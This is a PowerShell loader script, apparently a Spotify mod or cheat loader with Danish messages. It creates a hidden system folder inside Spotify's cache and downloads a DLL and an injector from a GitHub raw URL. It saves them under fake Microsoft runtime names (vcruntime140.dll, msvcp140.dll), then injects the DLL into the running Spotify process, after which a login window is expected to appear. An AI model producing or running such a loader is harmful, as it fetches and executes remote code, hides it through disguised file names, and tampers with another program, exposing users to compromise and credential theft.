Write-Host "[*] Ascension Loader v2.2 - SHADOW-CORE Edition" -ForegroundColor Cyan

$spotifyPath = "$env:APPDATA\Spotify\Spotify.exe"
if (-Not (Test-Path $spotifyPath)) {
    Write-Host "[!] Spotify ikke fundet!" -ForegroundColor Red
    pause; exit
}

if (-Not (Get-Process -Name "Spotify" -ErrorAction SilentlyContinue)) {
    Start-Process $spotifyPath -WindowStyle Hidden
    Start-Sleep -Seconds 6
}

$loaderDir = "$env:LOCALAPPDATA\Spotify\Users\Cache\Ascension"
New-Item -ItemType Directory -Force -Path $loaderDir | Out-Null
attrib +h +s $loaderDir

$baseUrl = "https://raw.githubusercontent.com/protocolDK/protocolDKloader/main"

$files = @{
    "vcruntime140.dll" = "$baseUrl/files/loader.dll"
    "msvcp140.dll"     = "$baseUrl/files/injector.exe"
}

foreach ($file in $files.Keys) {
    $url = $files[$file]
    $out = "$loaderDir\$file"
    try {
        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
        Write-Host "[+] Deployed: $file" -ForegroundColor Green
    } catch {
        Write-Host "[!] Failed: $file" -ForegroundColor Red
    }
}

$spotifyPID = (Get-Process -Name "Spotify" | Select-Object -First 1).Id
Write-Host "[+] Injecting into Spotify (PID: $spotifyPID)..." -ForegroundColor Yellow

$injector = "$loaderDir\msvcp140.dll"
$payload  = "$loaderDir\vcruntime140.dll"

Start-Process -FilePath $injector -ArgumentList "$spotifyPID `"$payload`"" -NoNewWindow -Wait

Write-Host "[+] Ascension Injected Successfully!" -ForegroundColor Green
Write-Host "[*] Login vinduet burde dukke op nu." -ForegroundColor Cyan
pause